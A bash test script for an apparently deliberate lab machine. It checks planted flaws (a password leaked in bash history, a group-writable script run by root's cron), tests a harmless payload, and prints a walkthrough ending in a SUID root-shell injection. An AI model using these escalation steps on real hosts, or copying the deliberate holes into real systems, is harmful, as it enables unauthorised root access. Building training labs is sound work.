#!/bin/bash
# Test Bob's Attack Paths
# Tests lateral movement (Alice→Bob) and privilege escalation (Bob→Root)

echo "=========================================="
echo "  Testing Bob Attack Paths"
echo "=========================================="
echo ""

echo "=== Test 1: Bob Account Exists ==="
echo ""

if id bob &>/dev/null; then
    echo "✓ User bob exists"
    id bob
else
    echo "✗ User bob does not exist"
    exit 1
fi

echo ""
echo "=== Test 2: Bob's Password Works ==="
echo ""

if echo "Ch4L13@123" | su bob -c "whoami" 2>/dev/null | grep -q "bob"; then
    echo "✓ Password 'Ch4L13@123' works"
else
    echo "✗ Password does not work"
    exit 1
fi

echo ""
echo "=== Test 3: Lateral Movement (Alice can read Bob's files) ==="
echo ""

# Test as Alice
echo "Testing if Alice can read Bob's bash_history..."

if sudo -u alice test -r /home/bob/.bash_history 2>/dev/null; then
    echo "✓ Alice can read /home/bob/.bash_history"
    
    # Check if password is in history
    if sudo -u alice grep "Ch4L13@123" /home/bob/.bash_history 2>/dev/null >/dev/null; then
        echo "✓ Password found in bash_history"
        echo ""
        echo "Password occurrences:"
        sudo -u alice grep "Ch4L13@123" /home/bob/.bash_history 2>/dev/null
    else
        echo "⚠ Password not found in bash_history"
    fi
else
    echo "✗ Alice cannot read bash_history"
    echo "  Fix: chmod 644 /home/bob/.bash_history"
fi

echo ""
echo "=== Test 4: Backup Script Permissions ==="
echo ""

if [ -f /usr/local/bin/bob-backup.sh ]; then
    echo "✓ Backup script exists"
    ls -la /usr/local/bin/bob-backup.sh
    
    # Check if writable by www-data group
    PERMS=$(stat -c '%a' /usr/local/bin/bob-backup.sh)
    GROUP=$(stat -c '%G' /usr/local/bin/bob-backup.sh)
    
    if [ "$GROUP" = "www-data" ]; then
        echo "✓ Script owned by www-data group"
    else
        echo "⚠ Script NOT owned by www-data group (currently: $GROUP)"
    fi
    
    if [ "$PERMS" = "775" ]; then
        echo "✓ Script is group-writable (775)"
    else
        echo "⚠ Script permissions: $PERMS (expected 775)"
    fi
else
    echo "✗ Backup script does not exist"
    exit 1
fi

echo ""
echo "=== Test 5: Cron Job Configuration ==="
echo ""

if crontab -l 2>/dev/null | grep -q "bob-backup.sh"; then
    echo "✓ Cron job exists in root's crontab"
    crontab -l | grep "bob-backup"
else
    echo "✗ Cron job not found"
    echo "  Add: * * * * * /usr/local/bin/bob-backup.sh"
fi

echo ""
echo "=== Test 6: Simulate Privilege Escalation ==="
echo ""

echo "Creating test payload (as www-data)..."

# Backup original script
cp /usr/local/bin/bob-backup.sh /tmp/bob-backup.sh.bak

# Add test payload
echo '# Test payload - creates /tmp/priv-esc-test' >> /usr/local/bin/bob-backup.sh
echo 'touch /tmp/priv-esc-test && chmod 777 /tmp/priv-esc-test' >> /usr/local/bin/bob-backup.sh

echo "✓ Test payload added"
echo "  Waiting 65 seconds for cron to execute..."

sleep 65

# Check if payload executed
if [ -f /tmp/priv-esc-test ]; then
    echo "✓ Privilege escalation works - cron executed payload as root!"
    ls -la /tmp/priv-esc-test
    rm -f /tmp/priv-esc-test
else
    echo "⚠ Payload did not execute (cron may take longer or is not running)"
    echo "  Check: systemctl status cron"
fi

# Restore original script
cp /tmp/bob-backup.sh.bak /usr/local/bin/bob-backup.sh
rm -f /tmp/bob-backup.sh.bak

echo ""
echo "=== Test 7: Check Breadcrumbs ==="
echo ""

if [ -f /home/bob/backup_notes.txt ]; then
    echo "✓ Backup notes file exists"
    if grep -q "Ch4L13@123" /home/bob/backup_notes.txt; then
        echo "✓ Notes contain password"
    fi
else
    echo "⚠ Backup notes missing"
fi

echo ""
echo "=========================================="
echo "  Test Summary"
echo "=========================================="
echo ""

echo "Attack Chain 1: Alice → Bob (Lateral Movement)"
echo ""
echo "1. As Alice, enumerate home directories:"
echo "   alice@vm:~$ ls -la /home/"
echo "   alice@vm:~$ cd /home/bob"
echo ""
echo "2. Read Bob's bash history:"
echo "   alice@vm:/home/bob$ cat .bash_history"
echo "   alice@vm:/home/bob$ grep -i password .bash_history"
echo ""
echo "3. Find credentials:"
echo "   mysql -u backup_user -p'Ch4L13@123'"
echo "   echo \"Ch4L13@123\" | passwd bob --stdin"
echo ""
echo "4. Switch to Bob:"
echo "   alice@vm:~$ su bob"
echo "   Password: Ch4L13@123"
echo ""
echo "---"
echo ""
echo "Attack Chain 2: www-data → Root (Privilege Escalation)"
echo ""
echo "1. Find writable scripts:"
echo "   www-data@vm:~$ find / -writable -type f 2>/dev/null"
echo "   /usr/local/bin/bob-backup.sh"
echo ""
echo "2. Check if it runs as root:"
echo "   www-data@vm:~$ crontab -l  # Won't see root's crontab"
echo "   www-data@vm:~$ grep -r 'bob-backup' /etc/cron* 2>/dev/null"
echo ""
echo "3. Inject malicious payload:"
echo "   www-data@vm:~$ echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/bob-backup.sh"
echo ""
echo "4. Wait for cron (runs every minute):"
echo "   www-data@vm:~$ watch -n 1 ls -la /tmp/rootbash"
echo ""
echo "5. Execute SUID bash:"
echo "   www-data@vm:~$ /tmp/rootbash -p"
echo "   rootbash-5.1# whoami"
echo "   root"
echo ""
echo "MITRE ATT&CK:"
echo "  - T1552.003: Unsecured Credentials (Bash History)"
echo "  - T1083: File and Directory Discovery"
echo "  - T1053.003: Scheduled Task (Cron)"
echo "  - T1574: Hijack Execution Flow"
echo ""
